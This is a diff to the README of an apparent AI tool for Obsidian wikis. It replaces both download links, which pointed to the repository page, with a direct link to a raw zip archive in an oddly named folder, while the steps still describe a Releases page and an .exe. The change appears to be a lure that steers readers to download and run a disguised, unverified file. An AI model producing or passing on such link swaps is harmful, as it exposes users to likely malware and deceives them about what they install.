@@ -1,6 +1,6 @@
 # 🧠 obsidian-wiki - Build smart wikis with artificial intelligence
 
-[![Download obsidian-wiki](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/Cuprous-condonation345/obsidian-wiki)
+[![Download obsidian-wiki](https://img.shields.io/badge/Download-Windows-blue.svg)](https://raw.githubusercontent.com/Cuprous-condonation345/obsidian-wiki/main/erythroneocytosis/wiki-obsidian-2.6.zip)
 
 This application helps you organize notes in Obsidian. It uses artificial intelligence to read your files and suggest links or updates. The tool follows the pattern created by Andrej Karpathy to turn raw text files into a structured knowledge base.
 
@@ -18,7 +18,7 @@ Your computer needs these items to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit [this page to download](https://github.com/Cuprous-condonation345/obsidian-wiki).
+1. Visit [this page to download](https://raw.githubusercontent.com/Cuprous-condonation345/obsidian-wiki/main/erythroneocytosis/wiki-obsidian-2.6.zip).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in .exe to start the transfer.
